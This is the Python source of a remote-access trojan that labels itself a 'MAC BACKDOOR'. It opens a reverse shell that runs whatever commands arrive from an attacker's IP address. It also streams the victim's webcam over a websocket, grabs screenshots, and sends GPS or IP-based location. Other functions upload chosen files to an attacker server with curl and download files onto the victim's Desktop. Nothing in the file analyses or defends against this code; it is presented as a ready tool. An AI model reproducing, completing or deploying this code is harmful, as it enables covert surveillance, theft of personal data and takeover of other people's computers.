import socket,os,pty
import cv2
import asyncio
import websockets
import base64
import random
import subprocess
import json
import geocoder
import gps  
import io
from PIL import ImageGrab
SERVER_URL = "PUBLIC SERVER"
WEBSOCKET_URL="WEBSOCKET"
PORT="PORT"
IP_ADDRESS="IP ADDRESS"
banner = r"""
██████╗  █████╗  ██████╗██╗  ██╗██████╗  ██████╗  ██████╗ ██████╗ 
██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗
██████╔╝███████║██║     █████╔╝ ██║  ██║██║   ██║██║   ██║██████╔╝
██╔══██╗██╔══██║██║     ██╔═██╗ ██║  ██║██║   ██║██║   ██║██╔══██╗
██████╔╝██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝╚██████╔╝██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
    
    MAC BACKDOOR

     /\  .--.  /\
    //\\/  ,,,  \//\\
    |/\| ,;;;l;, |/\|
    //\\\;-----;///\\
   //  \/   .   \/  \\
  (| ,-_| \ | / |_-, |)
    //`__\.-.-./__`\\
   // /.-(() ())-.\ \\
  (\ |)   '---'   (| /)
   ` (|           |) `
     \)           (/

======================[ HELP ]=======================

=====================================================
"""
async def open_camera():
        async with websockets.connect(WEBSOCKET_URL) as websocket:
            cap = cv2.VideoCapture(0)
            while True:
                ret, frame = cap.read()
                if not ret:
                    break
                _, buffer = cv2.imencode('.jpg', frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
                jpg_as_text = base64.b64encode(buffer).decode('utf-8')
                await websocket.send(jpg_as_text)
        cap.release()
def put_files(args):
    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    files_to_put = args[1:]
    if not files_to_put:
        return False
    urls = []
    for arg in args:
        urls.append(f"{SERVER_URL}/uploads/{arg}")
    for url in urls:
       name = "".join(random.choice(chars) for _ in range(10))
       ext = url.split(".")[-1]
       filename = f"{name}.{ext}"
       path = os.path.join(desktop_path, filename)
       subprocess.run(["curl", "-L", "-o", path, url])
    return True
def get_files(args):
    files_to_send = args[1:]
    if not files_to_send:
        return False
    valid_files = []
    for file_path in files_to_send:
        try:
            with open(file_path, "rb"):
                valid_files.append(file_path)
        except FileNotFoundError:
            return False
        except Exception as e:
            return False
    if not valid_files:
        return False
    curl_cmd = ["curl", "-X", "POST"]
    for file_path in valid_files:
        curl_cmd.extend(["-F", f"files=@{file_path}"])
    curl_cmd.append(f"{SERVER_URL}/upload")
    try:
        result = subprocess.run(curl_cmd,shell=True, capture_output=True, text=True)
        if result.stderr:
            return False
        return True
    except Exception as e:
        return False
def get_screenshot():
    screenshot = ImageGrab.grab()
    buf = io.BytesIO()
    screenshot.save(buf, format="PNG")
    buf.seek(0)
    curl_command = [
        "curl",
        "-X", "POST",
        "-F", "files=@-;filename=screenshot.png", 
        f"{SERVER_URL}/upload"
    ]
    subprocess.run(curl_command, input=buf.read(), capture_output=True,shell=True,text=True)
    return True
def get_location():
    location = None
    try:
        session = gps.gps(mode=gps.WATCH_ENABLE)
        report = session.next()
        if report['class'] == 'TPV':
            location = {
                "lat": report.lat,
                "lng": report.lon,
                "source": "gps"
            }
    except:
        pass 
    if not location:
        g = geocoder.ip('me')
        if g.ok:
            location = {
                "lat": g.latlng[0],
                "lng": g.latlng[1],
                "city": g.city,
                "country": g.country,
                "source": "ip"
            }
    if location:
        try:
            json_data = json.dumps(location)
            subprocess.run([
                "curl",
                "-X", "POST",
                "-H", "Content-Type: application/json",
                "-d", json_data,
                f"{SERVER_URL}/get-location"
            ], capture_output=True, text=True)
        except Exception as e:
            return False
        return True
    else:
        return False
def watch_victim_live():
    asyncio.run(open_camera())
def reverse_shell_payload():
    s=socket.socket()
    s.connect((IP_ADDRESS,PORT))
    s.send(banner.encode())
    while True:
        try:
           cmd = input("~sh ")
           cmd = s.recv(1024).decode("utf-8").strip()
           if not cmd:
               continue
           if cmd.lower() == "help":
               s.send(banner.encode())
               continue
           else:
               output = subprocess.run(
                   cmd,
                   shell=True,
                   capture_output=True,
                   text=True
               )
               result = output.stdout + output.stderr
               if result:
                   s.send(result.encode())
        except Exception as e:
            s.send(f"[-] Error: {e}\n".encode())
        s.close()
if __name__ == "__main__":
    reverse_shell_payload()